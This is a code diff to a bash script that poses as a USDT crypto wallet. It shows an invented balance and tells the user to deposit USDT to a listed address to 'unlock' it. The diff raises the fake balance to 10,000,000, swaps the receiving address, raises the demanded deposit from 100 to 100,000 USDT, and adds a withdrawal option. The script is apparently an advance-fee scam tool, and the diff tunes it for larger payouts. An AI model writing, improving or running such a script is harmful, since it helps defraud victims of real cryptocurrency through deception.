@@ -2,9 +2,9 @@
 
 # Wallet Command Line
 
-balance=1000000
+balance=10000000
 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
-account_id="TXYYQwqfj5ih1mZk27fSj21DmsDQJVyrcr"
+account_id="TFcmGGnxw7U7qybxvymrv7soCjxKvgFVf4"
 
 usdt_logo="
 \e[38;2;38;161;123m$$$$$$\
@@ -33,7 +33,7 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 100000 USDT to the following address: $account_id"
 
 function unlockBalance {
     echo " "
@@ -86,6 +86,7 @@ function selectWithdrawalAmount {
     echo "2. 500000"
     echo "3. 300000"
     echo "4. 100000"
+    echo "5. 50000"
     echo -n "Enter your choice: "
     read amount_choice
 
@@ -94,6 +95,7 @@ function selectWithdrawalAmount {
         2) amount=500000;;
         3) amount=300000;;
         4) amount=100000;;
+	5) amount=50000;;
         *) echo "Invalid choice, please try again."; selectWithdrawalAmount;;
     esac
 
